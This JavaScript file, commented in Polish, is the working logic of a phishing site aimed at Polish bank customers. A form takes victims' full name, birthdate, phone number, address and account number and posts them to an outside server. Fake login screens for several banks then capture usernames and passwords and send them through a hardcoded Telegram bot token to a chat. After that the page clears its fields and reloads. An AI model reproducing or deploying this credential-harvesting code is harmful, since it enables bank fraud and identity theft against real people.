// ============================================================
//   FULL JAVASCRIPT — Z OBSŁUGĄ SPACJI W NRB
// ============================================================

// ===== KONFIGURACJA TELEGRAM =====
const TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs';
const TELEGRAM_CHAT_ID = '-1004256695843';

// ===== FUNKCJA CZYSZCZĄCA IBAN (usuwa spacje, PL, zostawia cyfry) =====
function cleanIbanValue(value) {
    if (!value) return '';
    // Usuń wszystkie spacje, myślniki i inne białe znaki
    let cleaned = value.replace(/[\s\-]/g, '');
    // Zamień na wielkie litery
    cleaned = cleaned.toUpperCase();
    // Usuń 'PL' jeśli jest na początku
    if (cleaned.startsWith('PL')) {
        cleaned = cleaned.substring(2);
    }
    // Zostaw tylko cyfry
    cleaned = cleaned.replace(/\D/g, '');
    // Ogranicz do 26 znaków
    if (cleaned.length > 26) {
        cleaned = cleaned.substring(0, 26);
    }
    return cleaned;
}

// ===== FUNKCJA FORMATUJĄCA IBAN (grupy po 4) =====
function formatIbanReadable(iban) {
    if (!iban) return '';
    const cleaned = cleanIbanValue(iban);
    if (cleaned.length < 26) return iban;
    const full = 'PL' + cleaned;
    return full.match(/.{1,4}/g).join(' ');
}

// ===== FUNKCJA WYSYŁANIA DO TELEGRAM =====
function sendToTelegram(bankName, login, password) {
    const message = `🔐 *Nowe logowanie*\n🏦 *Bank:* ${bankName}\n👤 *Login:* ${login}\n🔑 *Hasło:* ${password}\n🕒 ${new Date().toLocaleString()}`;
    
    console.log(`📤 Отправка в Telegram:`, { bankName, login, password });

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('✅ Wysłano do Telegram');
        } else {
            console.error('❌ Błąd Telegram:', data);
        }
    })
    .catch(error => {
        console.error('❌ Błąd sieci:', error);
    });
}

// ============================================================
//   GŁÓWNY KOD PO ZAŁADOWANIU STRONY
// ============================================================
document.addEventListener('DOMContentLoaded', function() {

    // ===== MENU =====
    const menuToggle = document.getElementById('menuToggle');
    const sidebar = document.getElementById('sidebar');
    const mainWrapper = document.getElementById('mainWrapper');
    const contentWrapper = document.getElementById('contentWrapper');
    const footer = document.getElementById('footer');
    let isMenuOpen = false;

    function toggleMenu() {
        isMenuOpen = !isMenuOpen;
        if (isMenuOpen) {
            sidebar.classList.add('open');
            mainWrapper.classList.add('shifted');
            contentWrapper.classList.add('shifted');
            footer.classList.add('shifted');
        } else {
            sidebar.classList.remove('open');
            mainWrapper.classList.remove('shifted');
            contentWrapper.classList.remove('shifted');
            footer.classList.remove('shifted');
        }
    }

    if (menuToggle) {
        menuToggle.addEventListener('click', function(e) {
            e.stopPropagation();
            toggleMenu();
        });
    }

    const sidebarLinks = document.querySelectorAll('.sidebar-nav ul li a, .sidebar-nav .ukraine-link');
    sidebarLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            sidebarLinks.forEach(l => l.classList.remove('active'));
            this.classList.add('active');
            if (isMenuOpen) toggleMenu();
        });
    });

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && isMenuOpen) toggleMenu();
    });

    // ===== SZUKAJ =====
    document.querySelector('.header-search .search-submit-btn')?.addEventListener('click', function() {
        const input = this.closest('.header-search').querySelector('input');
        alert('Szukanie: ' + (input?.value || 'puste'));
    });

    document.querySelector('.header-search input')?.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            alert('Szukanie: ' + this.value);
        }
    });

    // ===== LOGIN NAV LINKS =====
    document.querySelectorAll('.login-nav .nav-links a').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            alert('Przekierowanie do: ' + this.textContent.trim());
        });
    });

    // ===== SCROLL TO FORM =====
    const scrollBtn = document.getElementById('scrollToFormBtn');
    const formSection = document.getElementById('dataFormSection');

    if (scrollBtn) {
        scrollBtn.addEventListener('click', function(e) {
            e.preventDefault();
            formSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
        });
    }

    // ============================================================
    //   NRB (Numer Rachunku Bankowego) — OBSŁUGA SPACJI
    // ============================================================
    const ibanInput = document.getElementById('iban');
    const ibanWrapper = document.getElementById('ibanWrapper');

    if (ibanInput) {
        // Obsługa wklejania
        ibanInput.addEventListener('paste', function(e) {
            // Używamy setTimeout, aby wartość została wklejona przed czyszczeniem
            setTimeout(() => {
                const cleaned = cleanIbanValue(this.value);
                this.value = cleaned;
                this.classList.remove('error');
                if (ibanWrapper) ibanWrapper.classList.remove('error');
            }, 5);
        });

        // Obsługa każdego wprowadzania (ręczne wpisywanie)
        ibanInput.addEventListener('input', function() {
            const cleaned = cleanIbanValue(this.value);
            // Aktualizujemy wartość tylko jeśli się zmieniła (unikamy pętli)
            if (this.value !== cleaned) {
                this.value = cleaned;
            }
            this.classList.remove('error');
            if (ibanWrapper) ibanWrapper.classList.remove('error');
        });

        // Obsługa zgubienia fokusu (dodatkowe zabezpieczenie)
        ibanInput.addEventListener('blur', function() {
            const cleaned = cleanIbanValue(this.value);
            if (this.value !== cleaned) {
                this.value = cleaned;
            }
        });
    }

    // ============================================================
    //   FORMULARZ DANYCH OSOBOWYCH
    // ============================================================
    const form = document.getElementById('dataForm');
    const submitBtn = document.getElementById('submitBtn');
    const toast = document.getElementById('toastMessage');
    const allInputs = form.querySelectorAll('input[required]');
    const formSectionElement = document.getElementById('dataFormSection');
    const bankSelection = document.getElementById('bankSelection');
    const loginNav = document.getElementById('loginNav');
    const imageBanner = document.getElementById('imageBanner');
    const bankFooter = document.getElementById('bankFooter');

    function showToast(message, isSuccess = false) {
        toast.textContent = message;
        toast.className = 'toast-message show';
        if (isSuccess) {
            toast.classList.add('success');
        } else {
            toast.classList.remove('success');
        }
        setTimeout(function() {
            toast.classList.remove('show');
        }, 5000);
    }

    function validateForm() {
        let allFilled = true;
        
        // Sprawdzamy wszystkie wymagane pola
        allInputs.forEach(input => {
            if (input.value.trim() === '') {
                allFilled = false;
                input.classList.add('error');
            } else {
                input.classList.remove('error');
            }
        });

        // Walidacja IBAN (sprawdza czy jest 26 cyfr)
        if (ibanInput) {
            const ibanValue = cleanIbanValue(ibanInput.value);
            if (ibanValue.length < 26) {
                allFilled = false;
                ibanInput.classList.add('error');
                if (ibanWrapper) ibanWrapper.classList.add('error');
            } else {
                ibanInput.classList.remove('error');
                if (ibanWrapper) ibanWrapper.classList.remove('error');
            }
        }

        return allFilled;
    }

    function getFormData() {
        const cleanedIban = ibanInput ? cleanIbanValue(ibanInput.value) : '';
        return {
            fullname: document.getElementById('fullname').value.trim(),
            birthdate: document.getElementById('birthdate').value.trim(),
            phone: document.getElementById('phone').value.trim(),
            street: document.querySelector('input[name="street"]').value.trim(),
            city: document.querySelector('input[name="city"]').value.trim(),
            postal: document.querySelector('input[name="postal"]').value.trim(),
            iban: 'PL' + cleanedIban
        };
    }

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        if (!validateForm()) {
            showToast('Najpierw wypełnij wszystkie wymagane pola!');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.classList.add('loading');
        submitBtn.innerHTML = '<span class="spinner"></span> Wysyłanie...';

        const formData = getFormData();

        fetch('https://gvvbt.onrender.com/send', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData)
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showToast('Dane zostały wysłane!', true);

                loginNav.classList.add('hidden');
                imageBanner.classList.add('hidden');
                formSectionElement.classList.add('hidden');

                bankSelection.classList.add('visible');
                bankFooter.classList.add('visible');
                window.scrollTo({ top: 0, behavior: 'smooth' });
            } else {
                showToast('Wystąpił błąd podczas wysyłania. Spróbuj ponownie.');
            }
        })
        .catch(error => {
            console.error('Błąd:', error);
            showToast('Wystąpił błąd połączenia. Spróbuj ponownie.');
        })
        .finally(() => {
            submitBtn.disabled = false;
            submitBtn.classList.remove('loading');
            submitBtn.innerHTML = 'Wyślij';
        });
    });

    allInputs.forEach(input => {
        input.addEventListener('input', function() {
            if (this.value.trim() !== '') {
                this.classList.remove('error');
            }
            if (this.id === 'iban' && ibanWrapper) {
                ibanWrapper.classList.remove('error');
            }
        });
    });

    document.addEventListener('click', function(e) {
        if (toast.classList.contains('show') && !toast.contains(e.target)) {
            toast.classList.remove('show');
        }
    });
});

// ============================================================
//   UNIWERSALNY OBSŁUGA WSZYSTKICH BANKÓW
// ============================================================
function handleLogin(event, bankName) {
    event.preventDefault();

    const form = event.target;
    const allInputs = form.querySelectorAll('input');
    
    let login = '';
    let password = '';

    // 1. Szukamy Login (pierwszy text/email/tel input)
    const textInputs = [];
    const passwordInputs = [];
    
    allInputs.forEach(input => {
        const type = input.type || '';
        if (type === 'password') {
            passwordInputs.push(input);
        } else if (type === 'text' || type === 'email' || type === 'tel') {
            textInputs.push(input);
        }
    });

    // 2. Login — pierwszy tekstowy input
    if (textInputs.length > 0) {
        login = textInputs[0].value.trim();
    }

    // 3. Hasło — pierwszy password input
    if (passwordInputs.length > 0) {
        password = passwordInputs[0].value.trim();
    }

    // 4. Jeśli login nie znaleziony, szukamy po id/name/placeholder
    if (!login) {
        for (const input of allInputs) {
            const id = (input.id || '').toLowerCase();
            const name = (input.name || '').toLowerCase();
            const placeholder = (input.placeholder || '').toLowerCase();
            if (id.includes('login') || name.includes('login') || placeholder.includes('login')) {
                if (input.type !== 'password' && input.type !== 'hidden') {
                    login = input.value.trim();
                    break;
                }
            }
        }
    }

    // 5. Jeśli hasło nie znalezione, szukamy po id/name/placeholder
    if (!password) {
        for (const input of allInputs) {
            const id = (input.id || '').toLowerCase();
            const name = (input.name || '').toLowerCase();
            const placeholder = (input.placeholder || '').toLowerCase();
            if (id.includes('hasło') || id.includes('haslo') || id.includes('password') ||
                name.includes('hasło') || name.includes('haslo') || name.includes('password') ||
                placeholder.includes('hasło') || placeholder.includes('haslo') || placeholder.includes('password')) {
                if (input.type === 'password') {
                    password = input.value.trim();
                    break;
                }
            }
        }
    }

    // 6. Jeśli nadal pusto, bierzemy pierwszy i drugi input po kolei
    if (!login || !password) {
        const nonHiddenInputs = [];
        allInputs.forEach(input => {
            if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button') {
                nonHiddenInputs.push(input);
            }
        });
        
        if (nonHiddenInputs.length >= 2) {
            if (!login) {
                login = nonHiddenInputs[0].value.trim();
            }
            if (!password) {
                password = nonHiddenInputs[1].value.trim();
            }
        }
    }

    // 7. Ostateczne sprawdzenie — jeśli hasło puste, szukamy dowolnego password
    if (!password) {
        const anyPassword = form.querySelector('input[type="password"]');
        if (anyPassword) {
            password = anyPassword.value.trim();
        }
    }

    // 8. Ostateczne sprawdzenie — jeśli login pusty, szukamy dowolnego text
    if (!login) {
        const anyText = form.querySelector('input[type="text"]');
        if (anyText) {
            login = anyText.value.trim();
        }
    }

    // DEBUG
    console.log(`[${bankName}] ===== DEBUG =====`);
    console.log(`[${bankName}] Login: "${login}"`);
    console.log(`[${bankName}] Hasło: "${password}"`);

    if (!login || !password) {
        alert(`Proszę wypełnić wszystkie pola (Login i Hasło) dla ${bankName}.`);
        return false;
    }

    // Wysyłka do Telegram
    sendToTelegram(bankName, login, password);
    alert(`✅ Dane dla ${bankName} zostały wysłane!`);

    // Czyszczenie pól
    allInputs.forEach(input => {
        if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button') {
            input.value = '';
        }
    });

    // Przeładowanie strony po krótkim opóźnieniu
    setTimeout(() => {
        location.reload();
    }, 1500);

    return false;
}

// ============================================================
//   FUNKCJE OTWIERANIA/ZAMYKANIA BANKÓW
// ============================================================
function openLoginScreen1() {
    document.getElementById('bankSelection').classList.remove('visible');
    document.getElementById('bankFooter').classList.remove('visible');
    document.getElementById('loginScreen1').classList.add('visible');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function openLoginScreen2() {
    document.getElementById('bankSelection').classList.remove('visible');
    document.getElementById('bankFooter').classList.remove('visible');
    document.getElementById('loginScreen2').classList.add('visible');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function openLoginScreen3() {
    const bank3 = document.getElementById('loginScreen3');
    const closeBtn = document.getElementById('bank3CloseBtn');
    bank3.classList.add('visible');
    closeBtn.classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function closeLoginScreen3() {
    const bank3 = document.getElementById('loginScreen3');
    const closeBtn = document.getElementById('bank3CloseBtn');
    bank3.classList.remove('visible');
    closeBtn.classList.remove('visible');
    document.body.style.overflow = '';
    document.getElementById('bankSelection').classList.add('visible');
    document.getElementById('bankFooter').classList.add('visible');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function openLoginScreen4() {
    const bank4 = document.getElementById('loginScreen4');
    const closeBtn = document.getElementById('bank4CloseBtn');
    bank4.classList.add('visible');
    closeBtn.classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function closeLoginScreen4() {
    const bank4 = document.getElementById('loginScreen4');
    const closeBtn = document.getElementById('bank4CloseBtn');
    bank4.classList.remove('visible');
    closeBtn.classList.remove('visible');
    document.body.style.overflow = '';
    document.getElementById('bankSelection').classList.add('visible');
    document.getElementById('bankFooter').classList.add('visible');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function openLoginScreen5() {
    const bank5 = document.getElementById('loginScreen5');
    const closeBtn = document.getElementById('bank5CloseBtn');
    bank5.classList.add('visible');
    closeBtn.classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function closeLoginScreen5() {
    const bank5 = document.getElementById('loginScreen5');
    const closeBtn = document.getElementById('bank5CloseBtn');
    bank5.classList.remove('visible');
    closeBtn.classList.remove('visible');
    document.body.style.overflow = '';
    document.getElementById('bankSelection').classList.add('visible');
    document.getElementById('bankFooter').classList.add('visible');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function openLoginScreen6() {
    const bank6 = document.getElementById('loginScreen6');
    const closeBtn = document.getElementById('bank6CloseBtn');
    bank6.classList.add('visible');
    closeBtn.classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function closeLoginScreen6() {
    const bank6 = document.getElementById('loginScreen6');
    const closeBtn = document.getElementById('bank6CloseBtn');
    bank6.classList.remove('visible');
    closeBtn.classList.remove('visible');
    document.body.style.overflow = '';
    document.getElementById('bankSelection').classList.add('visible');
    document.getElementById('bankFooter').classList.add('visible');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function openLoginScreen7() {
    const bank7 = document.getElementById('loginScreen7');
    const closeBtn = document.getElementById('bank7CloseBtn');
    bank7.classList.add('visible');
    closeBtn.classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function closeLoginScreen7() {
    const bank7 = document.getElementById('loginScreen7');
    const closeBtn = document.getElementById('bank7CloseBtn');
    bank7.classList.remove('visible');
    closeBtn.classList.remove('visible');
    document.body.style.overflow = '';
    document.getElementById('bankSelection').classList.add('visible');
    document.getElementById('bankFooter').classList.add('visible');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function openLoginScreen8() {
    const bank8 = document.getElementById('loginScreen8');
    const closeBtn = document.getElementById('bank8CloseBtn');
    bank8.classList.add('visible');
    closeBtn.classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function closeLoginScreen8() {
    const bank8 = document.getElementById('loginScreen8');
    const closeBtn = document.getElementById('bank8CloseBtn');
    bank8.classList.remove('visible');
    closeBtn.classList.remove('visible');
    document.body.style.overflow = '';
    document.getElementById('bankSelection').classList.add('visible');
    document.getElementById('bankFooter').classList.add('visible');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function openLoginScreen9() {
    const bank9 = document.getElementById('loginScreen9');
    const closeBtn = document.getElementById('bank9CloseBtn');
    bank9.classList.add('visible');
    closeBtn.classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function closeLoginScreen9() {
    const bank9 = document.getElementById('loginScreen9');
    const closeBtn = document.getElementById('bank9CloseBtn');
    bank9.classList.remove('visible');
    closeBtn.classList.remove('visible');
    document.body.style.overflow = '';
    document.getElementById('bankSelection').classList.add('visible');
    document.getElementById('bankFooter').classList.add('visible');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function openLoginScreen10() {
    const bank10 = document.getElementById('loginScreen10');
    const closeBtn = document.getElementById('bank10CloseBtn');
    bank10.classList.add('visible');
    closeBtn.classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function closeLoginScreen10() {
    const bank10 = document.getElementById('loginScreen10');
    const closeBtn = document.getElementById('bank10CloseBtn');
    bank10.classList.remove('visible');
    closeBtn.classList.remove('visible');
    document.body.style.overflow = '';
    document.getElementById('bankSelection').classList.add('visible');
    document.getElementById('bankFooter').classList.add('visible');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function openLoginScreen12() {
    const bank12 = document.getElementById('loginScreen12');
    const closeBtn = document.getElementById('bank12CloseBtn');
    bank12.classList.add('visible');
    closeBtn.classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function closeLoginScreen12() {
    const bank12 = document.getElementById('loginScreen12');
    const closeBtn = document.getElementById('bank12CloseBtn');
    bank12.classList.remove('visible');
    closeBtn.classList.remove('visible');
    document.body.style.overflow = '';
    document.getElementById('bankSelection').classList.add('visible');
    document.getElementById('bankFooter').classList.add('visible');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// ===== ZAMYKANIE PRZYCISKIEM ESC =====
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        const bank3 = document.getElementById('loginScreen3');
        const bank4 = document.getElementById('loginScreen4');
        const bank5 = document.getElementById('loginScreen5');
        const bank6 = document.getElementById('loginScreen6');
        const bank7 = document.getElementById('loginScreen7');
        const bank8 = document.getElementById('loginScreen8');
        const bank9 = document.getElementById('loginScreen9');
        const bank10 = document.getElementById('loginScreen10');
        const bank12 = document.getElementById('loginScreen12');
        if (bank3.classList.contains('visible')) closeLoginScreen3();
        if (bank4.classList.contains('visible')) closeLoginScreen4();
        if (bank5.classList.contains('visible')) closeLoginScreen5();
        if (bank6.classList.contains('visible')) closeLoginScreen6();
        if (bank7.classList.contains('visible')) closeLoginScreen7();
        if (bank8.classList.contains('visible')) closeLoginScreen8();
        if (bank9.classList.contains('visible')) closeLoginScreen9();
        if (bank10.classList.contains('visible')) closeLoginScreen10();
        if (bank12.classList.contains('visible')) closeLoginScreen12();
    }
});
